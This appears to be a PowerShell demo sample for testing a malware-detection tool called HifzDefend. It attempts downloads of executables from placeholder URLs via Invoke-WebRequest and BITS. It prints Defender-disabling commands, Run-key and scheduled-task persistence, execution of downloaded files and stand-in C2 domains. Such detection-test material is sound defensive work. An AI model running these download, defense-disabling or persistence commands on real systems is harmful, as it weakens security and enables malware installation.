# ============================================================================
# WARNING - SUSPICIOUS DEMO SCRIPT - suspicious_download.ps1
# ============================================================================
# Purpose: Demonstrates suspicious behavior patterns for testing
# Status: SUSPICIOUS - Contains download operations
# Expected Analysis: Should trigger WARNINGS and be flagged as SUSPICIOUS
# ============================================================================

<#
.SYNOPSIS
    Suspicious Download Pattern Demo

.DESCRIPTION
    This script demonstrates SUSPICIOUS behavior patterns that security tools
    should detect. It's a SAFE demo - all URLs are placeholders.

.EXAMPLE
    hifzdefend analyze-script suspicious_download.ps1

.NOTES
    **DEMO ONLY** - URLs are placeholders and don't point to real malware.
    Used to test HifzDefend's detection capabilities.
#>

# ==========================
# SUSPICIOUS PATTERN #1: Downloads from internet
# ==========================

# This script uses Invoke-WebRequest to download files
# Security tools should flag this as suspicious

$downloadUrl = "https://example.com/suspicious-file.exe"  # Placeholder URL
$outputPath = "$env:TEMP\downloaded_file.exe"

Write-Host "Attempting to download from: $downloadUrl" -ForegroundColor Yellow

# **NOTE**: This will fail because it's a placeholder URL
# Real malware would use actual malicious URLs here
try {
    Invoke-WebRequest -Uri $downloadUrl -OutFile $outputPath -ErrorAction Stop
    Write-Host "Download successful!" -ForegroundColor Green
} catch {
    Write-Host "Download failed (expected - demo URL)" -ForegroundColor Red
}

# ==========================
# SUSPICIOUS PATTERN #2: Using encoded commands
# ==========================

# Encoded PowerShell commands are often used by malware to evade detection
$encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Write-Host 'This is encoded'"))

Write-Host "`nUsing encoded command (SUSPICIOUS!):" -ForegroundColor Yellow
Write-Host "  Encoded: $encodedCommand"

# ==========================
# SUSPICIOUS PATTERN #3: Disabling security features
# ==========================

# Attempting to disable Windows Defender (won't work without admin)
Write-Host "`nAttempting to disable security features..." -ForegroundColor Red

# **NOTE**: These commands will fail without admin rights
# Listed here to show what malware might try to do

$suspiciousCommands = @(
    "Set-MpPreference -DisableRealtimeMonitoring $true",
    "Set-MpPreference -DisableIOAVProtection $true",
    "Add-MpPreference -ExclusionPath 'C:\Temp'"
)

foreach ($cmd in $suspiciousCommands) {
    Write-Host "  Would execute: $cmd" -ForegroundColor DarkRed
    Write-Host "  (Not actually executing - demo only)" -ForegroundColor Gray
}

# ==========================
# SUSPICIOUS PATTERN #4: Registry modifications
# ==========================

# Attempting to add to startup registry keys (common malware technique)
Write-Host "`nAttempting to modify startup registry..." -ForegroundColor Yellow

$startupPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$appName = "SuspiciousApp"
$appPath = "$env:TEMP\suspicious.exe"

Write-Host "  Would add: $appName to $startupPath" -ForegroundColor DarkRed
Write-Host "  (Not actually modifying - demo only)" -ForegroundColor Gray

# ==========================
# SUSPICIOUS PATTERN #5: Creating scheduled tasks
# ==========================

# Scheduled tasks are used for persistence
Write-Host "`nAttempting to create scheduled task..." -ForegroundColor Yellow

$taskName = "SuspiciousTask"
$taskAction = "C:\Temp\malware.exe"

Write-Host "  Would create task: $taskName" -ForegroundColor DarkRed
Write-Host "  Action: $taskAction" -ForegroundColor DarkRed
Write-Host "  (Not actually creating - demo only)" -ForegroundColor Gray

# ==========================
# SUSPICIOUS PATTERN #6: Using BitsTransfer
# ==========================

# BITS is often used by malware for stealthy downloads
Write-Host "`nUsing BITS for download..." -ForegroundColor Yellow

try {
    # **NOTE**: Will fail - placeholder URL
    Start-BitsTransfer -Source "https://example.com/payload.exe" `
                       -Destination "$env:TEMP\payload.exe" `
                       -ErrorAction Stop
} catch {
    Write-Host "  BITS transfer failed (expected - demo URL)" -ForegroundColor Gray
}

# ==========================
# SUSPICIOUS PATTERN #7: Executing downloaded files
# ==========================

# Executing downloaded executables is highly suspicious
Write-Host "`nWould execute downloaded file..." -ForegroundColor Red
Write-Host "  Start-Process $outputPath" -ForegroundColor DarkRed
Write-Host "  (Not actually executing - demo only)" -ForegroundColor Gray

# ==========================
# SUSPICIOUS PATTERN #8: Network connections to suspicious domains
# ==========================

# Attempting connections to suspicious domains
$suspiciousDomains = @(
    "malware-c2-server.com",
    "evil-payload-host.net",
    "trojan-download.org"
)

Write-Host "`nWould connect to suspicious domains:" -ForegroundColor Yellow
foreach ($domain in $suspiciousDomains) {
    Write-Host "  $domain" -ForegroundColor DarkRed
}
Write-Host "  (Not actually connecting - demo only)" -ForegroundColor Gray

# ==========================
# SUMMARY
# ==========================

Write-Host "`n========================================" -ForegroundColor Red
Write-Host " DEMO COMPLETE" -ForegroundColor Red
Write-Host "========================================" -ForegroundColor Red
Write-Host ""
Write-Host "This script demonstrated the following SUSPICIOUS patterns:" -ForegroundColor Yellow
Write-Host "  1. Downloads from internet (Invoke-WebRequest)" -ForegroundColor Yellow
Write-Host "  2. Encoded PowerShell commands" -ForegroundColor Yellow
Write-Host "  3. Attempts to disable security features" -ForegroundColor Yellow
Write-Host "  4. Registry modifications for persistence" -ForegroundColor Yellow
Write-Host "  5. Scheduled task creation" -ForegroundColor Yellow
Write-Host "  6. BITS transfer usage" -ForegroundColor Yellow
Write-Host "  7. Execution of downloaded files" -ForegroundColor Yellow
Write-Host "  8. Connections to suspicious domains" -ForegroundColor Yellow
Write-Host ""
Write-Host "**IMPORTANT**: No actual malicious actions were performed!" -ForegroundColor Green
Write-Host "All URLs and paths are placeholders for demonstration." -ForegroundColor Green
Write-Host ""

# HifzDefend Analysis Notes
# -------------------------
# This script should be flagged as SUSPICIOUS because:
# 1. Downloads files from internet (Invoke-WebRequest, BITS)
# 2. Uses encoded commands (obfuscation technique)
# 3. Attempts to disable security features
# 4. Modifies registry startup keys
# 5. Creates scheduled tasks (persistence)
# 6. Executes downloaded executables
# 7. Contacts suspicious domains
# 8. Multiple IoCs (Indicators of Compromise)
#
# Recommended Action: QUARANTINE or BLOCK
# Risk Level: MEDIUM to HIGH
